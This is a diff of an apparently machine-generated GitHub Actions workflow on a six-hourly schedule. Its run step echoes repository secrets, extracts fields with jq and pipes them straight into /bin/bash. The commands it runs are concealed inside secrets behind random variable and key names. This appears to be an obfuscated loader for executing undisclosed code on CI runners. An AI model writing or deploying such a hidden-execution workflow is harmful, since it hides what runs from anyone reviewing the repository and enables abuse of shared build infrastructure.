@@ -1,29 +1,22 @@
 name: powerfuldebate
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 3/6 * * *'
-
-jobs:  # 25640
+    - cron: '32 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: powerfuldebate
         env:
-          xswxy655: ${{ secrets.xswxy655 }}
+          nz278: ${{ secrets.nz278 }}
         run: |
-          echo $xswxy655 | jq -r .cc83 | /bin/bash
-          echo $rex31 | jq -r .unsn4423 | /bin/bash
-          echo $ylfd88388 | jq -r .qtglq3631 | /bin/bash
-          echo $kps87 | jq -r .oy13954 | /bin/bash
-          echo $lc59 | jq -r .ip38 | /bin/bash
-          echo $lipnz74953 | jq -r .ko8 | /bin/bash
-          echo $pz64571 | jq -r .mcowa9 | /bin/bash
-          echo $jcdi1 | jq -r .puib23096 | /bin/bash
-          echo $mp75692 | jq -r .kxhts531 | /bin/bash
-          echo $nsj53227 | jq -r .s1 | /bin/bash
-          echo $gc847 | jq -r .y67898 | /bin/bash
-          echo $kc1 | jq -r .xmtgf207 | /bin/bash
-          echo $iwy14089 | jq -r .ddge8265 | /bin/bash
+          echo $nz278 | jq -r .zn87 | /bin/bash
+          echo $dxjj99 | jq -r .cuom8 | /bin/bash
+          echo $yoys0410 | jq -r .qioi49 | /bin/bash
+          echo $uj10452 | jq -r .n7627 | /bin/bash
+          echo $iyyeg29893 | jq -r .xsj71 | /bin/bash
 
